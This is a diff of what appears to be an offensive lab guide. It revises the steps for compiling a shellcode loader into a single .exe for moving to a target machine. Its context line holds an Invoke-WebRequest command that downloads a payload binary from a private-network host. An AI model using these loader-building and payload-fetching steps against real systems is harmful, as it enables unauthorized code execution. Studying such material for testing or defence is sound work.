@@ -474,24 +474,20 @@ Invoke-WebRequest -Uri http://192.168.10.200:8080/payload.bin -OutFile C:\Users\
 
 ### Step 4: Compile the Loader on the Dev Box
 
-On the dev box (ammulu), open Command Prompt:
+On the dev box (ammulu), open Command Prompt and create a new project:
 
 ```
 cd C:\Users\ammulu\Desktop
-csc /unsafe /out:loader01.exe 01_shellcode_loader.cs
-```
-
-Or if you are using the dotnet CLI:
-
-```
 dotnet new console -n Loader01
 ```
 
-Replace Program.cs with the loader code, then:
+Replace the contents of `Loader01\Program.cs` with the code from `01_shellcode_loader.cs`. Then publish as a single .exe file:
 
 ```
-dotnet build
+dotnet publish Loader01 -c Release -r win-x64 --self-contained false /p:PublishSingleFile=true -o output/
 ```
+
+The compiled binary is at `output\Loader01.exe`. The publish command bundles everything into one file. If you used `dotnet build` instead, you would get a stub .exe alongside a separate .dll file, and the .exe will fail on the target machine if you transfer only the .exe without the companion .dll.
 
 ### Step 5: Transfer Loader and Shellcode to the Target
 
